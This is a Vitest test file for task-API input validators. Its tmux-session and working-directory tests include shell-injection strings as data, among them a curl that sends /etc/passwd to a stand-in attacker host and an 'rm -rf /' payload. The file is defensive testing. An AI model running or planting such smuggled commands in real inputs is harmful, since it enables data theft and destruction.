/**
 * Tests for lib/task-validation.ts
 *
 * Covers the cases called out in TICKET-002:
 *   • Missing required fields on POST /api/tasks
 *   • Invalid enum values on PUT /api/tasks/[id]
 *   • Arbitrary status strings on PUT /api/tasks/[id]/status
 */

import { describe, it, expect } from "vitest";
import {
  validateTaskCreate,
  validateTaskUpdate,
  validateStatusUpdate,
  validateTmuxSession,
  validateWorkDir,
  VALID_PRIORITIES,
  VALID_STATUSES,
  VALID_COST_LEVELS,
  VALID_TASK_TYPES,
  TIMEOUT_MINUTES_MIN,
  TIMEOUT_MINUTES_MAX,
  MAX_RETRIES_MIN,
  MAX_RETRIES_MAX,
} from "../task-validation";

// ─── validateTaskCreate ───────────────────────────────────────────────────────

describe("validateTaskCreate — required fields", () => {
  it("rejects when both projectId and title are missing", () => {
    const err = validateTaskCreate({});
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/projectId and title are required/i);
  });

  it("rejects when projectId is missing", () => {
    const err = validateTaskCreate({ title: "Build feature" });
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/required/i);
  });

  it("rejects when title is missing", () => {
    const err = validateTaskCreate({ projectId: "proj-1" });
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/required/i);
  });

  it("rejects when projectId is empty string", () => {
    const err = validateTaskCreate({ projectId: "", title: "Task" });
    expect(err).not.toBeNull();
  });

  it("rejects when title is empty string", () => {
    const err = validateTaskCreate({ projectId: "proj-1", title: "" });
    expect(err).not.toBeNull();
  });

  it("accepts when both projectId and title are present", () => {
    const err = validateTaskCreate({ projectId: "proj-1", title: "Task" });
    expect(err).toBeNull();
  });
});

describe("validateTaskCreate — title length", () => {
  it("rejects a title longer than 500 characters", () => {
    const err = validateTaskCreate({ projectId: "p", title: "x".repeat(501) });
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/500/);
    expect(err!.field).toBe("title");
  });

  it("accepts a title of exactly 500 characters", () => {
    const err = validateTaskCreate({ projectId: "p", title: "x".repeat(500) });
    expect(err).toBeNull();
  });
});

describe("validateTaskCreate — description length", () => {
  it("rejects a description longer than 10 000 characters", () => {
    const err = validateTaskCreate({
      projectId: "p",
      title: "T",
      description: "x".repeat(10_001),
    });
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/10 000/);
    expect(err!.field).toBe("description");
  });

  it("accepts a description of exactly 10 000 characters", () => {
    const err = validateTaskCreate({
      projectId: "p",
      title: "T",
      description: "x".repeat(10_000),
    });
    expect(err).toBeNull();
  });

  it("ignores null description", () => {
    expect(validateTaskCreate({ projectId: "p", title: "T", description: null })).toBeNull();
  });
});

describe("validateTaskCreate — enum fields", () => {
  const base = { projectId: "p", title: "T" };

  it("rejects an invalid priority", () => {
    const err = validateTaskCreate({ ...base, priority: "P9" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("priority");
    expect(err!.message).toMatch(/Invalid priority/);
  });

  it("accepts every valid priority value", () => {
    for (const p of VALID_PRIORITIES) {
      expect(validateTaskCreate({ ...base, priority: p })).toBeNull();
    }
  });

  it("rejects an invalid status", () => {
    const err = validateTaskCreate({ ...base, status: "deleted" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("status");
    expect(err!.message).toMatch(/Invalid status/);
  });

  it("rejects an arbitrary status string like 'done'", () => {
    const err = validateTaskCreate({ ...base, status: "done" });
    expect(err).not.toBeNull();
  });

  it("accepts every valid status value", () => {
    for (const s of VALID_STATUSES) {
      expect(validateTaskCreate({ ...base, status: s })).toBeNull();
    }
  });

  it("rejects an invalid estimatedCostLevel", () => {
    const err = validateTaskCreate({ ...base, estimatedCostLevel: "extreme" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("estimatedCostLevel");
  });

  it("accepts every valid estimatedCostLevel value", () => {
    for (const c of VALID_COST_LEVELS) {
      expect(validateTaskCreate({ ...base, estimatedCostLevel: c })).toBeNull();
    }
  });

  it("rejects an invalid taskType", () => {
    const err = validateTaskCreate({ ...base, taskType: "hacking" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("taskType");
  });

  it("accepts every valid taskType value", () => {
    for (const t of VALID_TASK_TYPES) {
      expect(validateTaskCreate({ ...base, taskType: t })).toBeNull();
    }
  });

  it("passes when optional enum fields are omitted", () => {
    expect(validateTaskCreate({ projectId: "p", title: "T" })).toBeNull();
  });

  it("passes when optional enum fields are null (explicit clear)", () => {
    expect(
      validateTaskCreate({ projectId: "p", title: "T", priority: null, status: null })
    ).toBeNull();
  });
});

// ─── validateTaskCreate — timeoutMinutes ─────────────────────────────────────

describe("validateTaskCreate — timeoutMinutes", () => {
  const base = { projectId: "p", title: "T" };

  it("accepts a valid timeoutMinutes (60)", () => {
    expect(validateTaskCreate({ ...base, timeoutMinutes: 60 })).toBeNull();
  });

  it("accepts the minimum value (1)", () => {
    expect(validateTaskCreate({ ...base, timeoutMinutes: TIMEOUT_MINUTES_MIN })).toBeNull();
  });

  it("accepts the maximum value (1440)", () => {
    expect(validateTaskCreate({ ...base, timeoutMinutes: TIMEOUT_MINUTES_MAX })).toBeNull();
  });

  it("rejects 0 (below minimum)", () => {
    const err = validateTaskCreate({ ...base, timeoutMinutes: 0 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("rejects a negative value", () => {
    const err = validateTaskCreate({ ...base, timeoutMinutes: -1 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("rejects a value above the maximum (99999)", () => {
    const err = validateTaskCreate({ ...base, timeoutMinutes: 99999 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
    expect(err!.message).toMatch(/1440/);
  });

  it("rejects NaN", () => {
    const err = validateTaskCreate({ ...base, timeoutMinutes: NaN });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("rejects a float value", () => {
    const err = validateTaskCreate({ ...base, timeoutMinutes: 30.5 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("rejects a string value", () => {
    const err = validateTaskCreate({ ...base, timeoutMinutes: "sixty" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("ignores null (not provided)", () => {
    expect(validateTaskCreate({ ...base, timeoutMinutes: null })).toBeNull();
  });

  it("ignores undefined (not provided)", () => {
    expect(validateTaskCreate({ ...base, timeoutMinutes: undefined })).toBeNull();
  });
});

// ─── validateTaskCreate — maxRetries ─────────────────────────────────────────

describe("validateTaskCreate — maxRetries", () => {
  const base = { projectId: "p", title: "T" };

  it("accepts 0 (minimum)", () => {
    expect(validateTaskCreate({ ...base, maxRetries: MAX_RETRIES_MIN })).toBeNull();
  });

  it("accepts the maximum value (10)", () => {
    expect(validateTaskCreate({ ...base, maxRetries: MAX_RETRIES_MAX })).toBeNull();
  });

  it("accepts a mid-range value (3)", () => {
    expect(validateTaskCreate({ ...base, maxRetries: 3 })).toBeNull();
  });

  it("rejects a negative value (-1)", () => {
    const err = validateTaskCreate({ ...base, maxRetries: -1 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("maxRetries");
  });

  it("rejects a value above the maximum (11)", () => {
    const err = validateTaskCreate({ ...base, maxRetries: 11 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("maxRetries");
    expect(err!.message).toMatch(/10/);
  });

  it("rejects NaN", () => {
    const err = validateTaskCreate({ ...base, maxRetries: NaN });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("maxRetries");
  });

  it("rejects a float value (1.5)", () => {
    const err = validateTaskCreate({ ...base, maxRetries: 1.5 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("maxRetries");
  });

  it("ignores null (not provided)", () => {
    expect(validateTaskCreate({ ...base, maxRetries: null })).toBeNull();
  });
});

// ─── validateTaskUpdate — timeoutMinutes and maxRetries ───────────────────────

describe("validateTaskUpdate — numeric fields", () => {
  it("accepts valid timeoutMinutes on update", () => {
    expect(validateTaskUpdate({ timeoutMinutes: 120 })).toBeNull();
  });

  it("rejects out-of-range timeoutMinutes on update", () => {
    const err = validateTaskUpdate({ timeoutMinutes: 9999 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("rejects negative timeoutMinutes on update", () => {
    const err = validateTaskUpdate({ timeoutMinutes: -5 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("timeoutMinutes");
  });

  it("accepts valid maxRetries on update", () => {
    expect(validateTaskUpdate({ maxRetries: 5 })).toBeNull();
  });

  it("rejects out-of-range maxRetries on update (above max)", () => {
    const err = validateTaskUpdate({ maxRetries: 100 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("maxRetries");
  });

  it("rejects negative maxRetries on update", () => {
    const err = validateTaskUpdate({ maxRetries: -1 });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("maxRetries");
  });

  it("ignores null timeoutMinutes on update", () => {
    expect(validateTaskUpdate({ timeoutMinutes: null })).toBeNull();
  });

  it("ignores null maxRetries on update", () => {
    expect(validateTaskUpdate({ maxRetries: null })).toBeNull();
  });

  it("passes an empty update body (no numeric fields)", () => {
    expect(validateTaskUpdate({})).toBeNull();
  });
});

// ─── validateTaskUpdate ───────────────────────────────────────────────────────

describe("validateTaskUpdate — enum fields", () => {
  it("passes for an empty update body", () => {
    expect(validateTaskUpdate({})).toBeNull();
  });

  it("rejects an invalid priority on update", () => {
    const err = validateTaskUpdate({ priority: "X1" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("priority");
  });

  it("rejects an invalid status on update", () => {
    const err = validateTaskUpdate({ status: "in-progress" });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("status");
  });

  it("rejects an arbitrary status string like 'wip'", () => {
    const err = validateTaskUpdate({ status: "wip" });
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/Invalid status/);
  });

  it("rejects an invalid estimatedCostLevel on update", () => {
    const err = validateTaskUpdate({ estimatedCostLevel: "very_high" });
    expect(err).not.toBeNull();
  });

  it("rejects an invalid taskType on update", () => {
    const err = validateTaskUpdate({ taskType: "unknown_type" });
    expect(err).not.toBeNull();
  });

  it("accepts all valid enum values on update", () => {
    for (const p of VALID_PRIORITIES) {
      expect(validateTaskUpdate({ priority: p })).toBeNull();
    }
    for (const s of VALID_STATUSES) {
      expect(validateTaskUpdate({ status: s })).toBeNull();
    }
    for (const c of VALID_COST_LEVELS) {
      expect(validateTaskUpdate({ estimatedCostLevel: c })).toBeNull();
    }
    for (const t of VALID_TASK_TYPES) {
      expect(validateTaskUpdate({ taskType: t })).toBeNull();
    }
  });
});

describe("validateTaskUpdate — field lengths", () => {
  it("rejects an updated title longer than 500 characters", () => {
    const err = validateTaskUpdate({ title: "x".repeat(501) });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("title");
  });

  it("accepts a null title (field not being updated)", () => {
    expect(validateTaskUpdate({ title: null })).toBeNull();
  });

  it("rejects an updated description longer than 10 000 characters", () => {
    const err = validateTaskUpdate({ description: "x".repeat(10_001) });
    expect(err).not.toBeNull();
    expect(err!.field).toBe("description");
  });
});

// ─── validateStatusUpdate ─────────────────────────────────────────────────────

describe("validateStatusUpdate — required", () => {
  it("rejects missing status (undefined)", () => {
    const err = validateStatusUpdate(undefined);
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/status is required/i);
  });

  it("rejects null status", () => {
    const err = validateStatusUpdate(null);
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/required/i);
  });

  it("rejects empty string status", () => {
    const err = validateStatusUpdate("");
    expect(err).not.toBeNull();
  });
});

describe("validateStatusUpdate — invalid enum values", () => {
  it("rejects an arbitrary string like 'done'", () => {
    const err = validateStatusUpdate("done");
    expect(err).not.toBeNull();
    expect(err!.message).toMatch(/Invalid status/);
  });

  it("rejects 'deleted'", () => {
    const err = validateStatusUpdate("deleted");
    expect(err).not.toBeNull();
  });

  it("rejects numeric values", () => {
    const err = validateStatusUpdate(1);
    expect(err).not.toBeNull();
  });

  it("rejects uppercase variant of a valid status", () => {
    // Status values are lowercase — 'PENDING' is not a valid status
    const err = validateStatusUpdate("PENDING");
    expect(err).not.toBeNull();
  });

  it("accepts every valid status value", () => {
    for (const s of VALID_STATUSES) {
      expect(validateStatusUpdate(s)).toBeNull();
    }
  });

  it("includes the bad value in the error message", () => {
    const err = validateStatusUpdate("INVALID_STATUS");
    expect(err!.message).toContain("INVALID_STATUS");
  });

  it("lists valid options in the error message", () => {
    const err = validateStatusUpdate("nope");
    for (const s of VALID_STATUSES) {
      expect(err!.message).toContain(s);
    }
  });
});

// ─── validateTmuxSession (RCE-1) ─────────────────────────────────────────────

describe("validateTmuxSession — valid values", () => {
  it("accepts a simple alphanumeric name", () => {
    expect(validateTmuxSession("claude")).toBeNull();
  });

  it("accepts a name with hyphens", () => {
    expect(validateTmuxSession("claude-agent-1")).toBeNull();
  });

  it("accepts a name with underscores", () => {
    expect(validateTmuxSession("claude_agent_1")).toBeNull();
  });

  it("accepts a name with dots", () => {
    expect(validateTmuxSession("claude.session.1")).toBeNull();
  });

  it("accepts a single character", () => {
    expect(validateTmuxSession("a")).toBeNull();
  });

  it("accepts exactly 64 characters", () => {
    expect(validateTmuxSession("a".repeat(64))).toBeNull();
  });
});

describe("validateTmuxSession — injection attacks rejected", () => {
  it("rejects semicolon injection", () => {
    const err = validateTmuxSession("claude; curl attacker.com/$(cat /etc/passwd)");
    expect(err).not.toBeNull();
    expect(err!.field).toBe("tmuxSession");
  });

  it("rejects semicolon-only injection", () => {
    expect(validateTmuxSession("claude;evil")).not.toBeNull();
  });

  it("rejects single-quote injection", () => {
    expect(validateTmuxSession("claude'")).not.toBeNull();
  });

  it("rejects double-quote injection", () => {
    expect(validateTmuxSession('claude"')).not.toBeNull();
  });

  it("rejects backtick command substitution", () => {
    expect(validateTmuxSession("claude`id`")).not.toBeNull();
  });

  it("rejects $() command substitution", () => {
    expect(validateTmuxSession("claude$(evil)")).not.toBeNull();
  });

  it("rejects pipe character", () => {
    expect(validateTmuxSession("claude|evil")).not.toBeNull();
  });

  it("rejects ampersand", () => {
    expect(validateTmuxSession("claude&evil")).not.toBeNull();
  });

  it("rejects spaces", () => {
    expect(validateTmuxSession("claude session")).not.toBeNull();
  });

  it("rejects newline", () => {
    expect(validateTmuxSession("claude\nevil")).not.toBeNull();
  });

  it("rejects empty string", () => {
    expect(validateTmuxSession("")).not.toBeNull();
  });

  it("rejects a value longer than 64 characters", () => {
    expect(validateTmuxSession("a".repeat(65))).not.toBeNull();
  });

  it("rejects non-string values", () => {
    expect(validateTmuxSession(null)).not.toBeNull();
    expect(validateTmuxSession(undefined)).not.toBeNull();
    expect(validateTmuxSession(123)).not.toBeNull();
  });
});

// ─── validateWorkDir (RCE-2) ──────────────────────────────────────────────────

describe("validateWorkDir — valid values", () => {
  it("accepts a simple absolute path", () => {
    expect(validateWorkDir("/home/worker")).toBeNull();
  });

  it("accepts root", () => {
    expect(validateWorkDir("/")).toBeNull();
  });

  it("accepts a path with hyphens and underscores", () => {
    expect(validateWorkDir("/home/worker-agent_1/project")).toBeNull();
  });

  it("accepts a path with dots", () => {
    expect(validateWorkDir("/opt/my.project/v1.2")).toBeNull();
  });

  it("accepts a path of exactly 255 characters", () => {
    const longPath = "/" + "a".repeat(254);
    expect(validateWorkDir(longPath)).toBeNull();
  });
});

describe("validateWorkDir — injection attacks rejected", () => {
  it("rejects semicolon injection", () => {
    expect(validateWorkDir("/tmp/'; rm -rf / #")).not.toBeNull();
  });

  it("rejects double-quote injection", () => {
    expect(validateWorkDir('/legit"; curl attacker.com #')).not.toBeNull();
  });

  it("rejects single-quote injection", () => {
    expect(validateWorkDir("/tmp/'evil'")).not.toBeNull();
  });

  it("rejects backtick command substitution", () => {
    expect(validateWorkDir("/tmp/`id`")).not.toBeNull();
  });

  it("rejects $() command substitution", () => {
    expect(validateWorkDir("/tmp/$(evil)")).not.toBeNull();
  });

  it("rejects relative paths", () => {
    expect(validateWorkDir("relative/path")).not.toBeNull();
    expect(validateWorkDir("./relative")).not.toBeNull();
    expect(validateWorkDir("../escape")).not.toBeNull();
  });

  it("rejects a path longer than 255 characters", () => {
    const tooLong = "/" + "a".repeat(255);
    expect(validateWorkDir(tooLong)).not.toBeNull();
  });

  it("rejects spaces in path", () => {
    expect(validateWorkDir("/home/worker dir")).not.toBeNull();
  });

  it("rejects pipe character", () => {
    expect(validateWorkDir("/tmp/evil|cmd")).not.toBeNull();
  });

  it("rejects newline", () => {
    expect(validateWorkDir("/tmp/\nevil")).not.toBeNull();
  });

  it("rejects non-string values", () => {
    expect(validateWorkDir(null)).not.toBeNull();
    expect(validateWorkDir(undefined)).not.toBeNull();
    expect(validateWorkDir(123)).not.toBeNull();
  });
});
